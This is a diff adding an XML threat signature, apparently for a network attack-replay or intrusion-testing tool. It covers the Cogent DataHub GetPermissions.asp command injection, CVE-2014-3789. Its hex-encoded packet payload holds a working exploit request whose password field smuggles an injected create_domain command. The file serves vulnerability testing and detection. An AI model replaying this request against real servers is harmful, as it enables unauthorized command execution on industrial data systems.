@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Cogent DataHub Web Server GetPermissions.asp Command Injection"/>
+    <EngDesc display="true" value="A remote command injection vulnerability has been reported in Cogent DataHub. The vulnerability is due to insufficient validation within the GetPermissions.asp  page.A remote attacker can exploit this vulnerability by submitting a maliciously crafted request to GetPermissions.asp . This can result in arbitrary command execution on the vulnerable system."/>
+    <Intent display="true">
+      <item value="INPUT_VALIDATION_ERROR"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="Moderate"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Cogent"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="DataHub"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="prior_to_7.3.5"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20140520-08"/>
+    <CVEID display="true" value="CVE-2014-3789"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="107097"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="ae5a2268d0c63dc5df2c0976ffdb74c1"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="LOW"/>
+    <Authentication display="false" value="NONE"/>
+    <ConfImpact display="false" value="PARTIAL"/>
+    <IntegImpact display="false" value="PARTIAL"/>
+    <AvailImpact display="false" value="PARTIAL"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635446486546984598"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1415961043" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+    <for index="C">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:50:56:B4:0E:03" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="010A" Identification="96C0" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="41EE" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="48724" destPort="$HTTPdestPort" SeqNumber="56A6CE1C" AckNumber="4A933712" HeaderLength="08" WindowSize="002E" Checksum="B710" UrgentPointer="0000" Options="0101080A0AF258A700000000" Payload="504F5354202F53696C7665726C696768742F4765745065726D697373696F6E732E61737020485454502F312E310D0A4163636570742D456E636F64696E673A206964656E746974790D0A436F6E74656E742D6C656E6774683A2034370D0A436F6E6E656374696F6E3A20636C6F73650D0A436F6E74656E742D747970653A206170706C69636174696F6E2F782D7777772D666F726D2D75726C656E636F6465640D0A486F73743A203137322E31362E382E32390D0A557365722D6167656E743A20507974686F6E2D75726C6C69622F322E340D0A0D0A757365726E616D653D54534C2670617373776F72643D4125323229286372656174655F646F6D61696E253230414141" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="C" Count="">
+      <Ethernet srcMac="00:50:56:B4:0E:03" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="01B7" Identification="4C58" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="4BA9" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="48724" SeqNumber="4A933712" AckNumber="56A6CF21" HeaderLength="08" WindowSize="F9EB" Checksum="BD11" UrgentPointer="0000" Options="0101080A000DB1E00AF25968" Payload="485454502F312E3120323030204F4B0D0A43616368652D436F6E74726F6C3A204E4F2D43414348452C204E4F2D53544F52450D0A446174653A205468752C203232204D617920323031342031343A30333A333120474D540D0A4C6173742D4D6F6469666965643A205468752C203232204D617920323031342031343A30333A333120474D540D0A457461673A202235333765336266332E6237220D0A436F6E74656E742D547970653A20746578742F68746D6C0D0A436F6E74656E742D4C656E6774683A203138330D0A0D0AEFBBBF0D0A0D0A3C633A5065726D697373696F6E5265636F72640D0A09786D6C6E733D22687474703A2F2F736368656D61732E6D6963726F736F66742E636F6D2F636C69656E742F32303037220D0A09786D6C6E733A633D22636C722D6E616D6573706163653A436F67656E742E44617461487562576562566965773B617373656D626C793D44617461487562576562566965774170706C69636174696F6E496E667261737472756374757265220D0A0D0A092F3E0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
